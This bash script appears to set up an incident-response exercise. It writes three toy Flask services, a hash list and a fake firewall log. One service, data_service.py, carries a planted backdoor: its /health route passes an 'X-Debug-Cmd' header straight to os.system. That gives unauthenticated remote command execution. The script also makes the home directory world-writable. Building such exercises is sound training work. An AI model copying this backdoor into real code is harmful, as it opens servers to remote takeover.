#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip coreutils
    pip3 install pytest flask

    useradd -m -s /bin/bash user || true

    mkdir -p /home/user/web_services

    cat << 'EOF' > /home/user/web_services/auth_service.py
from flask import Flask, request
app = Flask(__name__)
PORT = 8081

@app.route('/login', methods=['POST'])
def login():
    return "Login OK", 200

if __name__ == '__main__':
    app.run(port=PORT)
EOF

    cat << 'EOF' > /home/user/web_services/data_service.py
from flask import Flask, request
import os
app = Flask(__name__)
PORT = 8082

@app.route('/data', methods=['GET'])
def get_data():
    return "Data OK", 200

@app.route('/health', methods=['GET'])
def health_check():
    # Backdoor injected here
    cmd = request.headers.get('X-Debug-Cmd', 'echo 1')
    os.system(cmd)
    return "OK", 200

if __name__ == '__main__':
    app.run(port=PORT)
EOF

    cat << 'EOF' > /home/user/web_services/proxy_service.py
from flask import Flask, request
app = Flask(__name__)
PORT = 8083

@app.route('/proxy', methods=['GET'])
def proxy():
    return "Proxy OK", 200

if __name__ == '__main__':
    app.run(port=PORT)
EOF

    cat << 'EOF' > /tmp/data_service_clean.py
from flask import Flask, request
import os
app = Flask(__name__)
PORT = 8082

@app.route('/data', methods=['GET'])
def get_data():
    return "Data OK", 200

@app.route('/health', methods=['GET'])
def health_check():
    return "OK", 200

if __name__ == '__main__':
    app.run(port=PORT)
EOF

    cd /home/user/web_services
    sha256sum auth_service.py > /home/user/hashes.txt
    sha256sum proxy_service.py >> /home/user/hashes.txt
    cd /tmp
    sha256sum data_service_clean.py | sed 's/data_service_clean.py/data_service.py/' >> /home/user/hashes.txt
    rm /tmp/data_service_clean.py

    cat << 'EOF' > /home/user/ufw.log
May 12 10:01:12 server kernel: [ 1234.567] [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22 SRC=192.168.1.100 DST=10.0.0.5 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=45678 DPT=8082 WINDOW=65535 RES=0x00 SYN URGP=0
May 12 10:01:15 server kernel: [ 1237.567] [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22 SRC=192.168.1.100 DST=10.0.0.5 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12346 DF PROTO=TCP SPT=45679 DPT=8082 WINDOW=65535 RES=0x00 SYN URGP=0
May 12 10:01:22 server kernel: [ 1244.567] [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22 SRC=192.168.1.101 DST=10.0.0.5 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12347 DF PROTO=TCP SPT=55678 DPT=8081 WINDOW=65535 RES=0x00 SYN URGP=0
May 12 10:01:25 server kernel: [ 1247.567] [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22 SRC=192.168.1.100 DST=10.0.0.5 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12348 DF PROTO=TCP SPT=45680 DPT=8082 WINDOW=65535 RES=0x00 SYN URGP=0
May 12 10:01:30 server kernel: [ 1252.567] [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22 SRC=192.168.1.102 DST=10.0.0.5 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12349 DF PROTO=TCP SPT=65678 DPT=8083 WINDOW=65535 RES=0x00 SYN URGP=0
May 12 10:01:35 server kernel: [ 1257.567] [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22 SRC=192.168.1.100 DST=10.0.0.5 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12350 DF PROTO=TCP SPT=45681 DPT=8082 WINDOW=65535 RES=0x00 SYN URGP=0
EOF

    chown -R user:user /home/user/web_services
    chown user:user /home/user/ufw.log /home/user/hashes.txt
    chmod -R 777 /home/user
